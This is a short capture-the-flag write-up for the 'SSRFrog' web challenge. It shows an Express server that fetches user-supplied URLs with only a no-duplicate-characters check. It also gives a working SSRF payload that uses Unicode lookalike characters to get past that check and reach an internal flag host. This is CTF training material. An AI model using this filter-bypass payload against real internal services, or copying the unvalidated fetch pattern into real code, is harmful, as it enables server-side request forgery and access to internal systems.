## SSRFrog
> **Category:** Web
> **Description:** http://chall.ctf.bamboofox.tw:9453/
> **Pad Link:** http://34.87.94.220/pad/web-ssrfrog
> **Flag:**
---


## Source Code
~~~html
<!-- btw, FLAG is on this server: http://the.c0o0o0l-fl444g.server.internal:80 -->
~~~

~~~javascript
const express = require("express");
const http = require("http");

const app = express();

app.get("/source", (req, res) => {
    return res.sendFile(__filename);
})
app.get('/', (req, res) => {
    const { url } = req.query;
    if (!url || typeof url !== 'string') return res.sendFile(__dirname + "/index.html");

    // no duplicate characters in `url`
    if (url.length !== new Set(url).size) return res.sendFile(__dirname + "/frog.png");

    try {
        http.get(url, resp => {
            resp.setEncoding("utf-8");
            resp.statusCode === 200 ? resp.on('data', data => res.send(data)) : res.send(":(");
        }).on('error', () => res.send("WTF?"));
    } catch (error) {
        res.send("WTF?");
    }
});
app.listen(3000, '0.0.0.0');
~~~



http://chall.ctf.bamboofox.tw:9453/?url=htTp:/\%E2%93%89He.c0o%E2%93%AAO%E2%82%80l-fL4%E2%91%A3%E2%82%84g%EF%BC%8EsErv%E2%93%94R%E3%80%82in%E2%93%A3%E2%92%BA%E2%93%87Na%E2%93%81

## References
https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery#bypass-using-enclosed-alphanumerics

## Bugs
SSRF

## Exploit Ideas



## Scripts

